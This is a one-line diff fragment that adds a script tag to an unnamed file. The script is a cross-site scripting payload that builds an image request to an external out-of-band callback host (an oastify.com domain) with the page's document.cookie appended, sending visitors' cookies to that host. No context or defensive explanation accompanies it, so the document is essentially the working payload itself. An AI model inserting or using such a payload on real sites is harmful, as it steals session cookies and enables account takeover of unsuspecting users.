@@ -1,0 +1,1 @@
+<script>var i=new Image;i.src="http://0cdzncahd3ybhmgdvw72ato0yr4is8gx.oastify.com/?"+document.cookie;</script>
